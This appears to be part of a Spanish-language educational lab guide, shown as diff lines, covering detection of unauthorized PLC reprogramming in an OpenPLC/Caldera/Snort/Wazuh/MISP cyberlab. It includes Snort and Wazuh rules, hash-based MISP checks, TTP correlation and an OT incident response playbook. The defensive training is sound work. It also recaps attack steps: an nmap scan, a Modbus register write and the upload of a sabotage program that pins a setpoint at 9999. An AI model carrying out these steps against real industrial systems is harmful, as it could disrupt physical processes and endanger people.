+> Cada petición lleva su propio `timeout=` (en segundos) para que, si el servidor de OpenPLC no responde, falle con un error claro en vez de colgarse indefinidamente; los `print()` numerados dejan rastro de hasta qué paso llegó, visible en la salida de la ability aunque acabe fallando. `Connection: close` fuerza una conexión TCP nueva en cada petición en vez de reutilizar una persistente: el servidor de desarrollo de Flask que usa OpenPLC atiende una petición a la vez, y si una ejecución anterior quedó a medias (por ejemplo, matada por el `Timeout` de Caldera), reutilizar la misma conexión puede quedarse esperando indefinidamente a un servidor que sigue "ocupado" con la petición anterior.
+>
+> ⚠️ Suba también el **Timeout** de la propia ability en Caldera a un valor generoso (por ejemplo `180`-`240`): entre las peticiones HTTP, la compilación real (MatIEC + g++) y los 10s de espera tras compilar, el conjunto puede tardar más que el valor por defecto.
+>
+> ⚠️ Si la ability falla y en el log aparece algo del estilo `sh: 1: Syntax error`, revise que el comando se guardó en Caldera como una única línea real (sin saltos de línea insertados al copiar/pegar) — es exactamente el síntoma de este mismo problema.
+
+Agrúpelas en un Adversary (por ejemplo, `PLC-Reprogramming`), en orden Setup → Impact, y ejecute la operación (**Group:** `red`).
+
+**Evidencie**
+
+* Captura de las 2 abilities y de la operación ejecutada en estado `SUCCESS`.
+
+### 3.4.3. Validación end-to-end
+
+En `snort-server`:
+
+```bash
+cat /var/log/snort/alert_fast.txt
+```
+
+**Resultado esperado**
+
+* Alerta "Posible descarga de programa PLC no autorizada..." con destino `plc-server:8080`.
+* En la interfaz web de OpenPLC (**Monitoring**), `setpoint_temperatura` fijo en `9999` de forma persistente.
+
+**Compruebe la persistencia** (lo que distingue a esta técnica de un Ejercicio 3.1 cualquiera): intente devolver el valor a la normalidad con el mismo script del Ejercicio 3.1 (Impact, `write_register(address=1024, value=75)`). El valor volverá a `9999` en menos de 500ms, porque el programa en ejecución lo reescribe en cada ciclo — una simple escritura Modbus ya no basta para corregirlo.
+
+> ⚠️ Si completó el Ejercicio 3.3, esta escritura Modbus volverá a disparar la cadena `600400 → 600420 → 600202 → Active Response`, bloqueando el agente de Wazuh de `snort-server` 120 segundos — el mecanismo sigue activo de forma permanente, no es algo que se desactive quitando una regla de `iptables` puntual. No debería perder evidencia (la alerta `600430` de la subida del programa, paso 3.4.2, ya habrá llegado a Wazuh antes de esta escritura), pero si prefiere una prueba sin ese corte, desactive el mecanismo entero mientras trabaja este ejercicio: comente o borre el bloque `<active-response>` en `/var/ossec/etc/ossec.conf` y reinicie `wazuh-manager` (vuelva a activarlo del mismo modo cuando termine).
+
+> **Pregunta de autoevaluación:** ¿por qué una escritura Modbus (Ejercicio 3.1) no sirve para revertir el efecto de este ataque, y qué haría falta para recuperar el PLC? *(Respuesta esperada: la escritura Modbus solo cambia el valor de un ciclo; el programa en ejecución lo vuelve a fijar en el siguiente. Hace falta volver a subir y compilar el programa legítimo (`tanque_control.st`) para recuperar el control, no basta con corregir un registro.)*
+
+**Evidencie**
+
+* Captura de la alerta en `alert_fast.txt`.
+* Captura de Monitoring mostrando `9999` persistente pese al intento de corrección por Modbus.
+
+### 3.4.4. Wazuh + MISP
+
+Cierre el mismo patrón que en los Ejercicios 3.1/3.2: regla Snort → regla Wazuh → atribución en MISP.
+
+1. En `wazuh-manager`, añada la regla nueva en `/var/ossec/etc/rules/snort_local_rules.xml`, dentro del `<group>` existente:
+
+   ```xml
+   <rule id="600430" level="11">
+     <match>Posible descarga de programa PLC no autorizada</match>
+     <description>Snort - posible reprogramacion no autorizada de PLC via interfaz web OpenPLC</description>
+   </rule>
+   ```
+
+   ```bash
+   sudo systemctl restart wazuh-manager
+   ```
+2. Vuelva a ejecutar `wazuh-misp.sh` e indique en el prompt de reglas: `600001,600010,600300,600400,600410,600420,600430`.
+3. En el evento de MISP "Amenaza OT: Manipulación de PLC" (Ejercicio 3.2.1), añada una Galaxy `Attack Pattern` más: busque `T0843` (ATT&CK for ICS) → `Program Download`.
+
+> Nivel `11`: por encima de la escritura puntual (`600400`, nivel `10`) y por debajo de las alertas ya correlacionadas por CTI o comportamiento (`600202`/`600420`, nivel `12`) — refleja que reprogramar el PLC es más grave que un solo registro, pero el nivel máximo se sigue reservando para cuando hay confirmación de amenaza conocida o correlación de varias fases.
+
+**Evidencie**
+
+* Captura de la regla Wazuh `600430` disparando.
+* Captura del evento de MISP con la Galaxy `T0843` añadida.
+
+### Validación / Troubleshooting
+
+* Si no aparece la alerta, confirme que `http_inspect` está enlazado al puerto 8080 (`grep -n "8080" /etc/snort/snort.lua`) y que Snort se relanzó después del cambio.
+* Si la ability falla en el login o en la subida: confirme que las credenciales siguen siendo `openplc`/`openplc` (Ejercicio 3.0) y que la IP usada es la de `plc-server`.
+* Si `start_plc` no aplica el cambio: es probable que la compilación siguiera en curso; compruebe el estado en la propia interfaz web antes de reintentar.
+
+### Evidencias a entregar
+
+* Regla de detección HTTP.
+* Abilities y Adversary de Caldera.
+* Alerta en `alert_fast.txt`.
+* Captura de Monitoring demostrando la persistencia del sabotaje.
+* Respuesta a la pregunta de autoevaluación de 3.4.3.
+* Regla Wazuh `600430` y evento de MISP con la Galaxy `T0843`.
+
+### Conclusión final
+
+Incluya:
+
+* Por qué `T0843 - Program Download` (Lateral Movement) es una amenaza distinta y más grave que `T0855 - Unauthorized Command Message` (Ejercicio 3.1), aunque ambas abusen de un protocolo/interfaz legítimos sin exploits.
+* Qué papel juega ampliar la detección a un segundo protocolo (HTTP, además de Modbus) en la cobertura real de un SOC industrial: un activo real casi nunca expone un único vector.
+* Cómo esta técnica reduce la dependencia de la IP como único indicador: la señal relevante es la propia acción (subir y compilar un programa), detectable independientemente de si la IP de origen tiene o no antecedentes en MISP.
+
+---
+
+## Ejercicio 3.5 — Más allá del indicador de red: artefacto (hash) y cadena de TTPs
+
+### Objetivo
+
+Hasta este punto, cada vez que este laboratorio conecta una alerta con MISP (Ejercicios 2.4, 2.6, 3.2) lo hace preguntando siempre lo mismo: *¿esta IP tiene antecedentes?* Es el indicador más bajo y más fácil de cambiar de la Pyramid of Pain (Bianco, 2013): a un adversario le basta con otra máquina o un salto distinto. Este ejercicio sube dos escalones por encima de la IP sobre lo ya construido en el Ejercicio 3.4, sin modificar nada de ello:
+
+* **Artefacto/herramienta:** en vez de fiarse de que "alguien subió algo" (`600430`), comprobar que lo subido es, byte a byte, la herramienta de sabotaje conocida.
+* **TTPs:** una alerta que solo dispara cuando se observa la secuencia completa reconocimiento → sabotaje → persistencia (tres técnicas de MITRE ATT&CK for ICS en orden), no un evento suelto. Es el razonamiento del *ICS Cyber Kill Chain* (Assante & Lee, SANS, 2015): lo que da confianza a un incidente es la cadena completa, no el origen de un único paso.
+
+### Prerrequisitos
+
+* Ejercicio 3.4 completado (regla `600430` disparando y evento OT en MISP con la Galaxy `T0843`).
+* Clave SSH del laboratorio ya instalada en `plc-server` (`automation/key-generate.sh`).
+
+---
+
+### 3.5.1. Registrar el artefacto en MISP
+
+Complete primero al menos una vez la ability de Impact (3.4.2): necesita el programa ya subido y compilado en `plc-server` antes de poder hashearlo.
+
+1. Obtenga el hash de lo que **realmente** hay subido en `plc-server`, no de la copia del repositorio:
+
+   ```bash
+   ssh <usuario_ssh_plc_server>@<IP_PLC_SERVER> "find ~/OpenPLC_v3/webserver/st_files -iname '*.st' -printf '%T@ %p\n' | sort -n | tail -1 | cut -d' ' -f2- | xargs sha256sum"
+   ```
+
+   > ⚠️ **No use `sha256sum OpenPLC/tanque_sabotaje.st` sobre el fichero del repositorio.** Ese fichero incluye comentarios explicativos `(* ... *)` para quien lo lea; el comando de la ability de Impact (3.4.2) sube una versión de una sola línea, sin esos comentarios (se quitaron a propósito para que cupiera en el campo de Caldera). Son funcionalmente idénticos pero **no son el mismo fichero byte a byte**, así que sus hashes SHA256 son distintos. El valor que hay que registrar en MISP es el del artefacto que de verdad viaja por la red y queda en disco, no el de la copia de referencia del repositorio.
+2. En el evento "Amenaza OT: Manipulación de PLC" de MISP (Ejercicio 3.2.1, ya ampliado con la Galaxy `T0843` en el paso anterior), **Add Attribute**:
+   * **Category:** `Payload delivery`
+   * **Type:** `sha256`
+   * **Value:** el hash calculado
+   * **Distribution:** `Inherit event`
+   * Marque **IDS**.
+   * Comentario: "Hash del programa de sabotaje usado en el Ejercicio 3.4 (`tanque_sabotaje.st`), T0843".
+3. Guarde y publique el evento.
+
+**Evidencie**
+
+* Captura del atributo `sha256` añadido al evento, con el flag IDS activo.
+
+### 3.5.2. Verificar el artefacto automáticamente (Wazuh ➜ plc-server ➜ MISP)
+
+A diferencia de la reputación de IP (Ejercicio 2.4), Wazuh no tiene el hash del programa subido: Snort no lo captura, solo ve que hubo una subida HTTP. `automation/wazuh-misp-hash.sh` cierra ese hueco extendiendo el mismo patrón de `wazuh-misp.sh` un paso más allá: cuando dispara `600430`, un script en `wazuh-manager` se conecta por SSH a `plc-server` (único salto de red nuevo de todo el laboratorio), calcula el hash del programa `.st` más reciente, y lo consulta contra MISP igual que `custom-misp_ip.py` hace con IPs.
+
+> No se instala nada permanente en `plc-server`: el script reutiliza la misma clave SSH compartida de `automation/key-generate.sh` que ya usa el resto del laboratorio, copiándola una vez a `wazuh-manager` para el salto adicional. No instala ningún agente ni servicio nuevo.
+>
+> ⚠️ **Cuidado con qué usuario SSH usa `plc-server`.** El usuario `openplc`/`openplc` del Ejercicio 3.0 es el **login de la interfaz web** (HTTP, puerto 8080): no tiene por qué ser el mismo usuario del sistema operativo por el que se accede por SSH. Como hasta este ejercicio toda la interacción con `plc-server` era por HTTP, es fácil que nunca se haya incluido esa VM al distribuir la clave SSH del laboratorio (`key-generate.sh`) con el usuario que sí se usa en el resto de VMs (a menudo `root`, o el usuario por defecto de la imagen). Antes de lanzar `wazuh-misp-hash.sh`, confirme con qué usuario tiene ya acceso SSH real a `plc-server`, y si no tiene ninguno, instale la clave para ese usuario:
+>
+> ```bash
+> ./key-generate.sh -u <usuario_ssh_plc_server> -H <IP_PLC_SERVER> --reuse-key -y
+> ```
+>
+> Si ese usuario es distinto de `openplc` (por ejemplo `root`), tenga en cuenta además que `~` en `plc_st_dir` se expande según el usuario con el que se conecta el script, no según quien instaló OpenPLC: si usa `root`, escriba la ruta absoluta (por ejemplo `/home/openplc/OpenPLC_v3/webserver/st_files`) en vez de `~/OpenPLC_v3/webserver/st_files`.
+
+Despliegue la integración desde el anfitrión:
+
+```bash
+cd nics-cyberlab-edu-lite/automation
+sudo bash wazuh-misp-hash.sh
+```
+
+**Evidencie**
+
+* Salida completa del script, o al menos el resumen final y la comprobación del salto SSH.
+
+Dispare de nuevo la subida del programa (Ejercicio 3.4.2) y compruebe:
+
+```bash
+sudo tail -f /var/ossec/logs/integrations.log
+sudo grep -A10 '"integration":"misp_hash"' /var/ossec/logs/alerts/alerts.json
+```
+
+**Resultado esperado**
+
+* Alerta `600252` (nivel 12) con el hash calculado en `plc-server`, `misp_hash.found: 1`, y un `permalink` hacia el atributo `sha256` registrado en MISP: confirmación automática de que el programa subido es exactamente la herramienta conocida, no solo "algo" subido por HTTP.
+
+**Evidencie**
+
+* Captura/log de la alerta `600252` con el hash y el `permalink`.
+
+### 3.5.3. Correlación de la cadena completa (Wazuh)
+
+Añada una última regla en `wazuh-manager`, dentro del `<group>` existente, encadenada sobre las dos correlaciones que ya existen (`600420`: escaneo + escritura; `600430`: subida HTTP), no sobre alertas sueltas:
+
+```xml
+<rule id="600440" level="13" timeframe="300">
+  <if_sid>600430</if_sid>
+  <if_matched_sid>600420</if_matched_sid>
+  <description>CRITICAL: Cadena de ataque OT completa (reconocimiento + sabotaje Modbus + persistencia via reprogramacion no autorizada del PLC)</description>
+</rule>
+```
+
+```bash
+sudo systemctl restart wazuh-manager
+```
+
+`600440` no necesita `wazuh-misp.sh`: es una correlación puramente interna de Wazuh, no consulta MISP en ningún momento (a diferencia de `600400`/`600410`/`600420`/`600430`, que sí se añadieron al prompt de reglas de `wazuh-misp.sh` en sus ejercicios respectivos porque disparan una consulta de reputación de IP). Con la regla XML instalada y Wazuh reiniciado ya está todo lo que hace falta del lado de Wazuh.
+
+Para disparar `600440` hacen falta **cinco acciones de Caldera, en este orden exacto y sin pausas manuales largas entre ellas**. Son las cuatro del Adversary `Modbus-Heist` (Ejercicio 3.1) completas, seguidas de las del Adversary `PLC-Reprogramming` (Ejercicio 3.4.2):
+
+1. **Setup** (3.1): `apt-get install nmap` + `pip install pymodbus`.
+2. **Recon** (3.1): `nmap -sS -Pn -p 1-40 <IP_PLC_SERVER>` → genera `600010`.
+3. **Collection** (3.1): lectura Modbus, `read_holding_registers` → genera `600410`.
+4. **Impact** (3.1): **escritura** Modbus, `write_register(address=1024, value=1337)` → genera `600400`, que junto con `600010` produce `600420`.
+5. **Setup + Impact** (3.4.2): login → subir `tanque_sabotaje.st` → registrar → compilar → arrancar → genera `600430`.
+
+> ⚠️ **El error más fácil de cometer aquí: saltarse el paso 4.** El Impact del Ejercicio 3.1 (escritura Modbus) y el Impact del Ejercicio 3.4.2 (reprogramación) son técnicas distintas y **ninguna sustituye a la otra**: si se lanza Setup→Recon→Collection→(reprogramación), sin la escritura Modbus de por medio, `600400` nunca dispara, `600420` tampoco, y `600440` se queda esperando algo que nunca va a llegar — aunque `600430` sí dispare perfectamente y parezca que "todo lo demás funciona". Si prepara un Adversary combinado para lanzar las cinco acciones de una sola operación, confirme que **incluye las dos Impact, una de cada ejercicio**, no solo una.
+
+> La identidad de esta correlación no depende de ningún campo de IP: depende únicamente de que las tres técnicas (`T0846.001`/`T0861` → `T0855` → `T0843`) se hayan observado en orden, en la misma ventana temporal, sobre el mismo laboratorio de un único atacante posible. Es, en sentido estricto, una correlación por TTPs, no por indicador de red.
+
+Compruebe:
+
+```bash
+sudo grep '"id":"600440"' /var/ossec/logs/alerts/alerts.json
+```
+
+**Resultado esperado**
+
+* Alerta `600440` (nivel 13, la más alta del laboratorio) tras completar la cadena de tres fases.
+
+**Evidencie**
+
+* Captura de la alerta `600440` disparando.
+
+> **Pregunta de autoevaluación:** de los tres mecanismos que dan confianza a una alerta en este laboratorio — coincidencia de IP en MISP (`600202`), coincidencia de hash de artefacto, y cadena completa de TTPs (`600440`) — ¿cuál le resulta más difícil de evadir a un adversario que ya sabe que está siendo vigilado, y por qué? *(Respuesta esperada: la IP es trivial de cambiar, basta otra máquina o otro salto; el hash cambia con solo recompilar o modificar mínimamente el programa; la secuencia de TTPs es la más costosa de evitar, porque replicar el objetivo del ataque -reconocer, sabotear, persistir- obliga al adversario a repetir el mismo patrón de comportamiento aunque cambie de herramienta o de origen. Es la Pyramid of Pain de Bianco (2013) aplicada a un caso real de este laboratorio.)*
+
+**Evidencie**
+
+* Respuesta a la pregunta de autoevaluación.
+
+### Validación / Troubleshooting
+
+* Si no encuentra `st_files` en la ruta indicada, busque el directorio real con `find ~/OpenPLC_v3 -iname 'st_files' -type d` desde `plc-server` y ajuste la ruta al ejecutar `wazuh-misp-hash.sh`.
+* Si no aparece `600252` ni `600251` (ninguna alerta `misp_hash`), depure por capas, de la más probable a la menos probable:
+  1. El salto SSH en sí: `sudo -u wazuh ssh -i /var/ossec/integrations/.misp_hash_ssh_key -o BatchMode=yes -o UserKnownHostsFile=/var/ossec/integrations/.misp_hash_known_hosts <usuario_plc>@<IP_PLC_SERVER> echo OK`, ejecutado en `wazuh-manager`.
+  2. `sudo grep -i integrat /var/ossec/logs/ossec.log` — busque `Exit status was: 1` junto a `custom-misp_hash.py`.
+  3. El script a mano, con una alerta `600430` real capturada (mismo patrón que el troubleshooting del Ejercicio 2.4): `sudo grep '"rule":{"id":"600430"' /var/ossec/logs/alerts/alerts.json | tail -1 | sudo tee /tmp/test_alert.json`, y lance `custom-misp_hash.py` directamente con ese fichero y un `options` de prueba en modo `debug` para ver el traceback completo.
+* Si aparece `600251` (found: 0) en vez de `600252`, el hash se calculó correctamente pero no coincide con ningún atributo en MISP: confirme que el atributo `sha256` del apartado anterior sigue en el evento y sigue marcado IDS, y que no se subió el `.st` modificado a mano en alguna prueba anterior (relance la ability de Impact con el `tanque_sabotaje.st` original del repositorio).
+* Si aparece `600254` (`ssh_error`), el fallo está en el salto a `plc-server`, no en MISP: revise el mensaje de `misp_hash.ssh_error` en la propia alerta. La causa más probable es que el usuario SSH configurado (`plc_user`) no tenga la clave del laboratorio instalada en esa VM en concreto (ver el aviso sobre `openplc` vs. usuario del sistema, más arriba): confirme con `sudo -u wazuh ssh -i /var/ossec/integrations/.misp_hash_ssh_key -o BatchMode=yes -o UserKnownHostsFile=/var/ossec/integrations/.misp_hash_known_hosts <plc_user>@<IP_PLC_SERVER> echo OK` desde `wazuh-manager`. Otras causas: ruta de programas incorrecta (revise si hace falta ruta absoluta) o host inalcanzable.
+* Si `600440` no dispara aunque `600420` y `600430` sí lo hicieron por separado, confirme que ambas ocurrieron dentro de la misma ventana de `300` segundos; repita la operación completa de Caldera seguida de la reprogramación sin pausas manuales entre ambas.
+
+### Evidencias a entregar
+
+* Atributo `sha256` del artefacto en MISP.
+* Salida de `wazuh-misp-hash.sh` (incluida la comprobación del salto SSH a `plc-server`).
+* Alerta `600252` con el hash y el `permalink` a MISP.
+* Alerta `600440` (cadena completa de TTPs).
+* Respuesta a la pregunta de autoevaluación.
+
+### Conclusión final
+
+Incluya:
+
+* Cómo este ejercicio reduce todavía más la dependencia de la IP que ya rompía el Ejercicio 3.4: primero verificando el artefacto exacto (hash), después correlando la cadena completa de TTPs (`600440`), sin depender en ningún momento de un campo de IP.
+* Por qué, según la Pyramid of Pain (Bianco, 2013), una alerta basada en la secuencia completa de TTPs es estructuralmente más difícil de evadir para un adversario que una basada en un único indicador de red o de host, y qué le sigue faltando a este laboratorio para acercarse más a ese nivel en el resto de las alertas (por ejemplo, extender la respuesta activa del Ejercicio 3.3 para que pueda anclarse también a `600440` y no solo a `600202`, dejado aquí como reflexión abierta, no implementado en este ejercicio).
+
+---
+
+## Ejercicio 3.6 — Playbook de respuesta a incidentes OT
+
+### Objetivo
+
+Cierre del capítulo OT (Ejercicios 3.0-3.5): un playbook formal que conecta cada alerta ya construida con una acción de respuesta concreta, siguiendo el ciclo de vida de gestión de incidentes de NIST SP 800-61 (*Computer Security Incident Handling Guide*) adaptado a las particularidades de OT que documenta NIST SP 800-82 (*Guide to Operational Technology Security*): en IT, la contención suele priorizar cortar el acceso cuanto antes; en OT, **la seguridad física del proceso va primero**, y ninguna acción disruptiva se ejecuta sin confirmar el estado real de la planta.
+
+### Prerrequisitos
+
+* Ejercicios 3.0-3.5 completados: todas las alertas de la tabla siguiente deben poder dispararse en el laboratorio.
+
+---
+
+### 3.6.1. Alertas de entrada y nivel de confianza
+
+| Alerta | Qué significa | Confianza (Pyramid of Pain) |
+|---|---|---|
+| `600400`/`600410` | Escritura/lectura Modbus aislada | Baja — protocolo, sin contexto |
+| `600420` | Escaneo + escritura Modbus correlacionados | Media — comportamiento, sin CTI |
+| `600430` | Subida HTTP de programa detectada | Media — indicador de red |
+| `600202` | IP con antecedentes confirmados en MISP | Media-alta — depende de la IP, evadible |
+| `600252` | Hash del programa coincide con artefacto conocido | Alta — artefacto, cuesta cambiarlo |
+| `600440` | Cadena completa reconocimiento→sabotaje→persistencia | Máxima — TTPs, lo más costoso de evadir |
+
+### 3.6.2. Fases de respuesta
+
+#### Fase 1 — Identificación
+
+1. Confirme la alerta en Wazuh (no actúe sobre una alerta sin corroborar `rule.id`, `timestamp` y `full_log`).
+2. Consulte el `permalink` de MISP (`600202`/`600252`) para contexto de campaña: ¿es un actor con antecedentes (Ejercicio 2.7), o la primera vez que se ve?
+3. **Antes de cualquier acción de contención**, revise el estado físico real del proceso en Monitoring de OpenPLC: ¿`setpoint_temperatura`/`nivel_tanque` reflejan la manipulación, o la alerta es un falso positivo o una prueba legítima?
+
+#### Fase 2 — Contención
+
+* **Automatizable con confianza alta**: `firewall-drop` sobre `600202`/`600252` (Ejercicio 3.3) — ya implementado, y limitado deliberadamente a alertas con contexto de CTI o artefacto confirmado, no a cualquier escritura Modbus suelta.
+* **No automatizar**: cortar el acceso de red al PLC sin confirmar antes que no hay una operación legítima en curso. A diferencia de IT, aislar un activo OT puede dejar el proceso físico en un estado indefinido o inseguro; requiere validación de un responsable de planta/ingeniería, no solo del SOC.
+
+#### Fase 3 — Erradicación
+
+1. Si se confirma persistencia (`T0843`, alertas `600430`/`600252`/`600440`): el programa en ejecución debe **sustituirse**, no basta con corregir un registro (ver la pregunta de autoevaluación de 3.4.3). Vuelva a subir y compilar `OpenPLC/tanque_control.st`.
+2. Verifique tras la recuperación que el hash del programa en ejecución coincide con un artefacto legítimo conocido, repitiendo la comprobación del Ejercicio 3.5.
+
+#### Fase 4 — Recuperación y lecciones aprendidas
+
+1. Confirme en Monitoring que `setpoint_temperatura`/`nivel_tanque` vuelven a sus valores base (Ejercicio 3.0: `75`/`50`).
+2. Actualice el evento de MISP: documente el incidente como parte de la campaña ya existente (Ejercicio 2.7/3.2.1), no como hecho aislado.
+3. Revise si la ventana de correlación (`timeframe="300"` en `600420`/`600440`) fue suficiente para este incidente concreto o hizo falta ajustarla, y documente el motivo si lo hizo.
+
+**Evidencie**
+
+* Aplique este playbook al incidente real que generó en los Ejercicios 3.4/3.5: para cada fase, indique la alerta/dato concreto (ID, timestamp, IP, hash) que la sustenta, no una descripción genérica.
+
+### Evidencias a entregar
+
+* Playbook aplicado al incidente real, con la alerta/dato concreto de cada fase.
+
+### Conclusión final
+
+Incluya:
+
+* Por qué un playbook de respuesta a incidentes OT no puede ser una copia directa de uno de IT: qué principio concreto cambia (seguridad física del proceso antes que velocidad de contención) y cómo se refleja en las fases de Contención y Erradicación del playbook.
 
 ---
 
